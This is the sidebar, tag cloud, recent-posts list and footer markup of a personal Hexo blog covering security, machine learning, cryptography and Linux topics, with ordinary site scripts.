href="/blog/categories/academic/">academic</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/blockchain/">blockchain</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/cplusplus/">cplusplus</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/go/">go</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/">linux</a><span class="category-list-count">34</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/git/">git</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/macos/">macos</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/linux/tools/">tools</a><span class="category-list-count">12</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/misc/">misc</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/misc/latex/">latex</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/ml/">ml</a><span class="category-list-count">27</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/ml/rl/">rl</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/network/">network</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/os/">os</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/php/">php</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/probabilities/">probabilities</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/python/">python</a><span class="category-list-count">64</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/security-miscellaneous/">security miscellaneous</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/shell/">shell</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/utilities/">utilities</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/">websec</a><span class="category-list-count">35</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/cmd-execution/">cmd_execution</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/file-upload/">file_upload</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/logic-vuln/">logic_vuln</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/sql-injection/">sql injection</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/websec/xss/">xss</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/wireshark/">wireshark</a><span class="category-list-count">7</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/blog/tags/academic/" style="font-size: 15px;">academic</a> <a href="/blog/tags/sci/" style="font-size: 15px;">sci</a> <a href="/blog/tags/jcr/" style="font-size: 15px;">jcr</a> <a href="/blog/tags/ml/" style="font-size: 15px;">ml</a> <a href="/blog/tags/cuda/" style="font-size: 15px;">cuda</a> <a href="/blog/tags/misc/" style="font-size: 15px;">misc</a> <a href="/blog/tags/vscode/" style="font-size: 15px;">vscode</a> <a href="/blog/tags/threat-intelligence/" style="font-size: 15px;">threat intelligence</a> <a href="/blog/tags/typing/" style="font-size: 15px;">typing</a> <a href="/blog/tags/distance/" style="font-size: 15px;">distance</a> <a href="/blog/tags/osi-sec/" style="font-size: 15px;">osi_sec</a> <a href="/blog/tags/smtp/" style="font-size: 15px;">smtp</a> <a href="/blog/tags/mail/" style="font-size: 15px;">mail</a> <a href="/blog/tags/Boot/" style="font-size: 15px;">Boot</a> <a href="/blog/tags/Computer/" style="font-size: 15px;">Computer</a> <a href="/blog/tags/FAT/" style="font-size: 15px;">FAT</a> <a href="/blog/tags/FDT/" style="font-size: 15px;">FDT</a> <a href="/blog/tags/os/" style="font-size: 15px;">os</a> <a href="/blog/tags/efi/" style="font-size: 15px;">efi</a> <a href="/blog/tags/Python/" style="font-size: 15px;">Python</a> <a href="/blog/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/blog/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 15px;">网络协议</a> <a href="/blog/tags/Wireshark%E5%8A%9F%E8%83%BD/" style="font-size: 15px;">Wireshark功能</a> <a href="/blog/tags/%E6%B8%97%E9%80%8F/" style="font-size: 15px;">渗透</a> <a href="/blog/tags/%E6%8A%93%E5%8C%85/" style="font-size: 15px;">抓包</a> <a href="/blog/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 15px;">计算机网络</a> <a href="/blog/tags/zkp/" style="font-size: 15px;">zkp</a> <a href="/blog/tags/circom/" style="font-size: 15px;">circom</a> <a href="/blog/tags/git/" style="font-size: 15px;">git</a> <a href="/blog/tags/ssh/" style="font-size: 15px;">ssh</a> <a href="/blog/tags/arch/" style="font-size: 15px;">arch</a> <a href="/blog/tags/manjaro/" style="font-size: 15px;">manjaro</a> <a href="/blog/tags/chmod/" style="font-size: 15px;">chmod</a> <a href="/blog/tags/ping/" style="font-size: 15px;">ping</a> <a href="/blog/tags/network/" style="font-size: 15px;">network</a> <a href="/blog/tags/find/" style="font-size: 15px;">find</a> <a href="/blog/tags/head/" style="font-size: 15px;">head</a> <a href="/blog/tags/tail/" style="font-size: 15px;">tail</a> <a href="/blog/tags/ioredirect/" style="font-size: 15px;">ioredirect</a> <a href="/blog/tags/pipe/" style="font-size: 15px;">pipe</a> <a href="/blog/tags/fd/" style="font-size: 15px;">fd</a> <a href="/blog/tags/iproute2/" style="font-size: 15px;">iproute2</a> <a href="/blog/tags/kill/" style="font-size: 15px;">kill</a> <a href="/blog/tags/hardlink/" style="font-size: 15px;">hardlink</a> <a href="/blog/tags/softlink/" style="font-size: 15px;">softlink</a> <a href="/blog/tags/netstat/" style="font-size: 15px;">netstat</a> <a href="/blog/tags/ss/" style="font-size: 15px;">ss</a> <a href="/blog/tags/lsof/" style="font-size: 15px;">lsof</a> <a href="/blog/tags/traceroute/" style="font-size: 15px;">traceroute</a> <a href="/blog/tags/vim/" style="font-size: 15px;">vim</a> <a href="/blog/tags/latex/" style="font-size: 15px;">latex</a> <a href="/blog/tags/CNN/" style="font-size: 15px;">CNN</a> <a href="/blog/tags/convolution/" style="font-size: 15px;">convolution</a> <a href="/blog/tags/CMake/" style="font-size: 15px;">CMake</a> <a href="/blog/tags/Make/" style="font-size: 15px;">Make</a> <a href="/blog/tags/php/" style="font-size: 15px;">php</a> <a href="/blog/tags/python/" style="font-size: 15px;">python</a> <a href="/blog/tags/re/" style="font-size: 15px;">re</a> <a href="/blog/tags/Regexp/" style="font-size: 15px;">Regexp</a> <a href="/blog/tags/shell/" style="font-size: 15px;">shell</a> <a href="/blog/tags/mysql/" style="font-size: 15px;">mysql</a> <a href="/blog/tags/pseudo-static/" style="font-size: 15px;">pseudo static</a> <a href="/blog/tags/sql-injection/" style="font-size: 15px;">sql injection</a> <a href="/blog/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/blog/tags/collection/" style="font-size: 15px;">collection</a> <a href="/blog/tags/collections/" style="font-size: 15px;">collections</a> <a href="/blog/tags/comprehensions/" style="font-size: 15px;">comprehensions</a> <a href="/blog/tags/fun/" style="font-size: 15px;">fun</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/blog/2023/09/18/ml/wasserstein_dist/">Delve into Wasserstein Distance, principles and implementation analysis</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/09/17/math/probabilities/wasserstein_bg/">Probabilities background for Wasserstein Distance</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/11/academic/papers/ldp_location/">L-SRR Local Differential Privacy for Location-Based Services with Staircase Randomized Response</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/10/academic/papers/ldp_byz_fl/">Practical Differentially Private and Byzantine-resilient Federated Learning</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/fedrecover/">FedRecover 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/flcert/">FLCert Provably Secure Federated Learning against Poisoning Attacks 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/08/04/academic/papers/fltrust/">FLTrust Byzantine-robust Federated Learning via Trust Bootstrapping 论文阅读笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/05/30/crypto/zk/specific2program/">zk with programmability</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/04/30/crypto/zk/great_resource/">zk 资料汇总</a></li><li class="post-list-item"><a class="post-list-link" href="/blog/2023/04/16/misc/latex/latex_grammars/">常用 LaTeX 语法总结</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://snowolf0620.xyz/" title="snowolf0620" target="_blank">snowolf0620</a><ul></ul><a href="https://space.keter.top/" title="Sonder" target="_blank">Sonder</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2024 <a href="/blog/." rel="nofollow">realyee's blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/blog/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.js"></script><script type="text/javascript" src="/blog/js/fancybox.js?v=1.0.0"></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/latest/jquery.fancybox.min.css"><link rel="stylesheet" type="text/css" href="/blog/css/search.css?v=1.0.0"><script type="text/javascript" src="/blog/js/search.js?v=1.0.0"></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+  search_path = 'search.xml';
+}
+var path = '/blog/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="/blog/js/copycode.js?v=1.0.0" successtext="Copy Successed!"></script><link rel="stylesheet" type="text/css" href="/blog/css/copycode.css?v=1.0.0"><script type="text/javascript" src="/blog/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/blog/js/smartresize.js?v=1.0.0"></script></div></body></html>
